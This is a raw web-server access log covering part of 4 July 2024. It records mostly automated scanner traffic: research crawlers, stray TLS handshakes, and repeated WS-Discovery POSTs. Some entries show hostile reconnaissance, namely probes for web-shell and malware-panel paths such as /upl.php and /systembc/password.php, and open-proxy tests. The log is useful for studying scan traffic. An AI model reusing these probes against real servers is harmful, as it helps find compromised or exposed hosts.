141.98.83.197 - - [04/Jul/2024:14:43:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.162.210.205 - - [04/Jul/2024:14:47:56 +0000] "\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\x85\xAAX\x05\x12&\xEF}\x16?\xA9U\x04$I-U\x8A\xF2\x18\xC7F\x129K\x14oL\xFA\xD2$b \xFF\x83\xB3\xC6?t\xEB\x84\x0B(l;AH\x9C4\xCB\x84y\x17\xD9\xED(\x89\xDD\xD4\x9EK\xBB\xC6\xABR\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
162.216.149.64 - - [04/Jul/2024:15:27:03 +0000] "GET / HTTP/1.1" 301 166 "http://180.233.121.154:1081/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
109.205.213.198 - - [04/Jul/2024:15:33:53 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [04/Jul/2024:15:41:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
46.19.143.66 - - [04/Jul/2024:15:42:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
179.43.161.135 - - [04/Jul/2024:15:42:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.83.197 - - [04/Jul/2024:15:45:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.3.86 - - [04/Jul/2024:16:07:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
34.22.213.78 - - [04/Jul/2024:16:18:57 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.32.2"
172.232.159.13 - - [04/Jul/2024:16:26:56 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
172.232.159.13 - - [04/Jul/2024:16:28:18 +0000] "\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbbb0100000001" 400 154 "-" "-"
172.232.159.13 - - [04/Jul/2024:16:28:21 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
172.232.159.13 - - [04/Jul/2024:16:28:21 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
159.223.121.63 - - [04/Jul/2024:16:39:37 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9F\x07\xB8\xA3\x08\x9F_\xE1]\xAApt\xDC-\xECw\x9E\x92\xD4\xCB\xA1v\xA8vk\xC5\xCE<\xAD\xA9\xFF\xFA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.223.121.63 - - [04/Jul/2024:16:39:37 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03`3\x95[\xEB\x99\x19\xC2}\xA2\x16\x01Og\x93\x1E\xA9\xA8\x22{\xDB\xB9\xDC\xA1\x10O-\x08\xB5\x02\xF1\xCA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.223.121.63 - - [04/Jul/2024:16:39:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.121.63 - - [04/Jul/2024:16:39:37 +0000] "GET /form.html HTTP/1.1" 301 166 "-" "curl/8.1.2"
159.223.121.63 - - [04/Jul/2024:16:39:38 +0000] "GET /upl.php HTTP/1.1" 301 166 "-" "Mozilla/5.0"
159.223.121.63 - - [04/Jul/2024:16:39:38 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03b\xEB\xA6\xF7pR\xCF\xAA\x88\x0C\xA4\xEFKCQ\xC2\x18\x9Eg\xD2\xEC\xC5\xE9_\x12\xD4D,\xAD\xE49\xC0\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.223.121.63 - - [04/Jul/2024:16:39:39 +0000] "GET /geoip/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.121.63 - - [04/Jul/2024:16:39:39 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.121.63 - - [04/Jul/2024:16:39:40 +0000] "GET /1.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.121.63 - - [04/Jul/2024:16:39:40 +0000] "GET /bundle.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.121.63 - - [04/Jul/2024:16:39:41 +0000] "GET /files/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.121.63 - - [04/Jul/2024:16:39:41 +0000] "GET /systembc/password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.121.63 - - [04/Jul/2024:16:39:41 +0000] "GET /password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.121.63 - - [04/Jul/2024:16:39:42 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.19.143.66 - - [04/Jul/2024:16:58:26 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [04/Jul/2024:16:58:49 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
43.130.31.48 - - [04/Jul/2024:17:07:26 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
109.205.213.198 - - [04/Jul/2024:17:07:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
192.168.0.101 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [04/Jul/2024:17:08:13 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
167.94.138.62 - - [04/Jul/2024:17:09:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.62 - - [04/Jul/2024:17:09:11 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
185.224.128.43 - - [04/Jul/2024:17:16:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.3.86 - - [04/Jul/2024:17:18:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
174.128.182.51 - - [04/Jul/2024:17:19:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
174.128.182.51 - - [04/Jul/2024:17:19:57 +0000] "" 400 0 "-" "-"
141.98.83.197 - - [04/Jul/2024:17:49:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.132.119 - - [04/Jul/2024:17:54:27 +0000] "GET http://uplo.ad/?v=1&ip=180.233.121.154&port=80 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36"
139.59.132.119 - - [04/Jul/2024:17:54:27 +0000] "CONNECT hanisntsolo.github.io:443 HTTP/1.1" 400 154 "-" "-"
149.50.103.48 - - [04/Jul/2024:18:04:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
138.68.71.68 - - [04/Jul/2024:18:19:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
149.50.103.48 - - [04/Jul/2024:18:23:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.248.17 - - [04/Jul/2024:18:36:09 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
94.156.248.17 - - [04/Jul/2024:18:37:44 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
110.159.240.52 - - [04/Jul/2024:18:40:44 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [04/Jul/2024:18:43:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.248.17 - - [04/Jul/2024:18:47:38 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
193.177.182.107 - - [04/Jul/2024:18:48:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
149.50.103.48 - - [04/Jul/2024:18:59:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
222.79.104.23 - - [04/Jul/2024:19:00:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.103.48 - - [04/Jul/2024:19:17:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [04/Jul/2024:19:21:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
15.204.194.30 - - [04/Jul/2024:19:29:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.86"
179.43.161.135 - - [04/Jul/2024:19:33:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.83.197 - - [04/Jul/2024:19:35:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [04/Jul/2024:19:39:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [04/Jul/2024:19:45:06 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [04/Jul/2024:19:54:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
149.50.103.48 - - [04/Jul/2024:20:01:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
170.106.104.42 - - [04/Jul/2024:20:03:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.103.48 - - [04/Jul/2024:20:23:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [04/Jul/2024:20:36:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [04/Jul/2024:20:39:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.28 - - [04/Jul/2024:20:45:51 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
139.59.3.86 - - [04/Jul/2024:20:52:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
169.197.140.199 - - [04/Jul/2024:20:55:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.3.25"
179.43.161.135 - - [04/Jul/2024:20:59:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [04/Jul/2024:21:01:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [04/Jul/2024:21:15:59 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [04/Jul/2024:21:18:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [04/Jul/2024:21:24:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
147.185.132.252 - - [04/Jul/2024:21:34:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
104.152.52.81 - - [04/Jul/2024:21:41:43 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
46.19.143.66 - - [04/Jul/2024:21:49:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [04/Jul/2024:21:53:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
93.158.90.41 - - [04/Jul/2024:21:54:15 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115"
93.158.90.41 - - [04/Jul/2024:21:54:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115"
4.255.99.75 - - [04/Jul/2024:21:55:02 +0000] "GET /druid/index.html HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
149.50.103.48 - - [04/Jul/2024:22:11:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.83.197 - - [04/Jul/2024:22:16:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [04/Jul/2024:22:18:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.31 - - [04/Jul/2024:22:33:23 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [04/Jul/2024:22:40:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
80.82.77.202 - - [04/Jul/2024:22:49:04 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 154 "-" "-"
80.82.70.133 - - [04/Jul/2024:22:49:26 +0000] "GET / HTTP/1.1" 301 166 "-" "fasthttp"
80.82.77.202 - - [04/Jul/2024:22:49:26 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC3qs\xDBU\xFAMp{\xDB\xAE\xC8X\xABd\xC8\x09\xDC\x9D\x80!\x82\xEAZ\x99mR\x1E\xAC\xD3W\x0B \xE7\x94\xB2^\x00\xB5a{\xF6" 400 154 "-" "-"
